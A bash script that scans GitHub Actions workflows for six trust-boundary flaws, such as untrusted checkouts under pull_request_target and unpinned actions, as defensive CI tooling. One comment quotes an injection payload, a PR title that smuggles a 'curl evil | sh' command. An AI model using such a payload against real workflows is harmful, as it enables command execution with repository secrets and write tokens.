#!/usr/bin/env bash
# GitHub Actions trust-boundary audit. Reads .github/workflows/*.y{a,}ml and exits
# non-zero on the classes where a workflow hands repository write or secrets to
# code the repository does not control.
#
# WHY A SCRIPT AND NOT A SKILL. Every rule below is documented by GitHub itself
# and a competent reviewer ASKED to security-review a workflow finds most of them.
# The delta is not knowledge, it is that nobody asks: workflow files are edited
# during unrelated work, reviewed for step ordering and cache keys, and merged.
# So this ships as a thing that runs, not a thing that is read — one line in the
# consumer's CI, and a PreToolUse hook (hooks/workflow-guard.sh) for the two
# unambiguous critical classes at the moment of the edit.
#
#   bash workflow-audit.sh [--dir DIR] [--quiet]
#
# Exit: 0 clean · 2 critical finding · 3 cannot read (no dir, no yq/grep)
#
# HONEST LIMITATION. This is a line-oriented scan, not a YAML parser: it reads
# what a workflow SAYS, and it can be fooled by an unusual layout, a composite
# action that hides the sink one level down, or a reusable workflow called with
# `secrets: inherit`. Treat a clean run as "none of the six known shapes are
# present in these files", never as "this pipeline is safe".
set -u

dir=".github/workflows"
quiet=0
while [ $# -gt 0 ]; do
  case "$1" in
    --dir) dir="${2:-}"; shift 2 ;;
    --quiet) quiet=1; shift ;;
    -h|--help) sed -n '2,20p' "$0"; exit 0 ;;
    *) printf 'workflow-audit: unknown argument %s\n' "$1" >&2; exit 3 ;;
  esac
done

[ -d "$dir" ] || { [ "$quiet" -eq 1 ] || printf 'workflow-audit: no %s — nothing to audit\n' "$dir"; exit 3; }

findings=0
crit=0
say() { [ "$quiet" -eq 1 ] || printf '%s\n' "$1"; }
finding() { # severity file line rule detail
  findings=$((findings + 1))
  [ "$1" = critical ] && crit=$((crit + 1))
  say "$(printf '%-8s %s:%s — %s\n           %s' "$1" "$2" "$3" "$4" "$5")"
}

shopt -s nullglob 2>/dev/null || true
files=$(find "$dir" -maxdepth 1 -type f \( -name '*.yml' -o -name '*.yaml' \) 2>/dev/null | sort)
[ -n "$files" ] || { say "workflow-audit: no workflow files in $dir"; exit 3; }

for wf in $files; do
  # 1. CRITICAL — pull_request_target / workflow_run that checks out a ref.
  #    The trigger runs with the BASE repo's secrets and a write token; checking
  #    out the PR head then executes fork-authored code inside that context. This
  #    is GitHub's own documented critical anti-pattern and it reads, to a
  #    reviewer skimming for correctness, as "checks out the PR — correct".
  if grep -qE '^[[:space:]]*(pull_request_target|workflow_run):' "$wf"; then
    ln=$(grep -nE '^[[:space:]]*(pull_request_target|workflow_run):' "$wf" | head -1 | cut -d: -f1)
    if grep -qE '^[[:space:]]*ref:[[:space:]]*\$\{\{[[:space:]]*github\.event\.(pull_request\.head|workflow_run\.head)' "$wf" \
       || grep -qE '^[[:space:]]*ref:[[:space:]]*\$\{\{[[:space:]]*github\.head_ref' "$wf"; then
      finding critical "$wf" "$ln" \
        "pull_request_target/workflow_run checks out untrusted head" \
        "Fork code runs with base-repo secrets and a write token. Build from the PR context with no secrets, or check out the BASE ref and treat the PR tree as data."
    else
      finding warn "$wf" "$ln" \
        "pull_request_target/workflow_run without an explicit untrusted checkout" \
        "Safe only while no step reaches PR-authored content (including a composite action or a script the PR can edit). Re-check on every change to this file."
    fi
  fi

  # 2. CRITICAL — an ATTACKER-CONTROLLED expression interpolated into a run:
  #    block. The value is substituted into the shell before it runs, so a PR
  #    title of `"; curl evil | sh; #` is command execution, not a string.
  #
  #    Matched by LEAF, not by prefix. `github.event.pull_request.*` as a whole is
  #    the wrong unit: `base.sha` and `number` are GitHub-generated and safe, and
  #    flagging them makes the rule cry wolf on ordinary CI — which is how a gate
  #    gets switched off. Only fields a PR author can type are listed. (Found by
  #    running this against its own repo: the first draft flagged
  #    `${{ github.event.pull_request.base.sha }}`, a 40-char SHA nobody controls.)
  while IFS=: read -r ln _; do
    [ -n "$ln" ] || continue
    finding critical "$wf" "$ln" \
      "attacker-controlled \${{ github.event.* }} interpolated into a shell step" \
      "This is substituted into the shell, not passed as an argument — a crafted title/branch/body is command execution. Pass it through an env: var and reference \"\$VAR\" instead."
  done < <(awk '
    /^[[:space:]]*-?[[:space:]]*run:/ { inrun=1 }
    inrun && /\$\{\{[[:space:]]*github\.(head_ref|event\.(pull_request\.(title|body|head\.(ref|label))|issue\.(title|body)|comment\.body|review\.body|discussion\.(title|body)|head_commit\.(message|author\.(name|email))|pages\[[0-9]*\]\.page_name))/ { print NR ":" }
    /^[[:space:]]*(uses|with|env|if|name):/ { inrun=0 }
  ' "$wf")

  # 3. WARN — third-party action pinned to a mutable tag. devops-practices already
  #    teaches no-`latest` for base images; a git tag is equally mutable and the
  #    action runs with the job's full token.
  while IFS= read -r line; do
    [ -n "$line" ] || continue
    ln="${line%%:*}"; ref="${line#*:}"
    case "$ref" in actions/*|github/*) continue ;; esac   # first-party, tag policy is theirs
    case "$ref" in ./*|docker://*) continue ;; esac        # local or pinned image
    printf '%s' "$ref" | grep -qE '@[0-9a-f]{40}$' && continue
    finding warn "$wf" "$ln" \
      "third-party action not pinned to a commit SHA: $ref" \
      "A tag is mutable — the author (or anyone who compromises them) can repoint it at new code that runs with this job's token. Pin the 40-char SHA and note the version in a comment."
  done < <(grep -nE '^[[:space:]]*-?[[:space:]]*uses:[[:space:]]*[^ ]+' "$wf" \
           | sed -E 's/^([0-9]+):[[:space:]]*-?[[:space:]]*uses:[[:space:]]*/\1:/' | sed 's/[[:space:]]*$//')

  # 4. WARN — no top-level permissions:. Without it the job inherits the repo
  #    default, which on many repos is still write-all.
  grep -qE '^permissions:' "$wf" || finding warn "$wf" 1 \
    "no top-level permissions: block" \
    "The job inherits the repository default token scope. Declare 'permissions: contents: read' at the top and widen per job only where needed."

  # 5. WARN — self-hosted runner on a fork-reachable trigger. A fork PR then runs
  #    on infrastructure the repo owns, with whatever state the last job left.
  if grep -qE '^[[:space:]]*runs-on:.*self-hosted' "$wf" \
     && grep -qE '^[[:space:]]*(pull_request|pull_request_target):' "$wf"; then
    ln=$(grep -nE '^[[:space:]]*runs-on:.*self-hosted' "$wf" | head -1 | cut -d: -f1)
    finding warn "$wf" "$ln" \
      "self-hosted runner on a fork-reachable trigger" \
      "Fork-authored code executes on your infrastructure and can read anything the previous job left behind. Use an ephemeral runner, or gate the job on the PR being same-repo."
  fi

  # 6. WARN — script injection's quieter cousin: secrets used in a job whose
  #    trigger a fork can reach.
  if grep -qE '^[[:space:]]*pull_request_target:' "$wf" && grep -qE '\$\{\{[[:space:]]*secrets\.' "$wf"; then
    ln=$(grep -nE '\$\{\{[[:space:]]*secrets\.' "$wf" | head -1 | cut -d: -f1)
    finding warn "$wf" "$ln" \
      "secrets referenced in a pull_request_target workflow" \
      "Every secret here is reachable from a fork PR if any step touches PR-controlled content. Move the secret-using steps to a separate workflow triggered on merge."
  fi
done

if [ "$findings" -eq 0 ]; then
  say "workflow-audit: clean — none of the six known shapes present in $(printf '%s\n' $files | wc -l | tr -d ' ') workflow file(s)"
  exit 0
fi
say ""
say "workflow-audit: $findings finding(s), $crit critical"
[ "$crit" -gt 0 ] && exit 2
exit 0
